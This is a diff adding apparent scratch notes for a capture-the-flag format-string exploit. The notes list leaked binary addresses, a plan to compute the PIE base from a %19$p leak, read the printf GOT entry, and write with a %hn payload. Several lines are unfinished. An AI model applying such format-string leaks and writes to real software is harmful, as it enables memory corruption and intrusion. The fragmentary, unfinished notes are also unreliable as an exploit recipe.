@@ -1,0 +1,23 @@
+rbp = 0x0000620335340159
+
+printf = 0x00006203353401bb
+printf@plt = 0x620335340040
+
+snd_printf = 0x00006203353401e4
+
+get rbp (%19$p)
+pie_base = rbp - rbp_offset (hardcoded)
+
+printf_plt_address = pie_base + printf_plt_offset (hardcoded = )
+printf_got_address = pie_base + printf_got_offset (hardcoded = 0x00004008)
+
+pop printf_address using %s and printf_got_address
+
+15 + 8 = 23
+
+
+cat flag.txt %{}X%11$hn
+
+14 + x + 
+
+8 8 8 
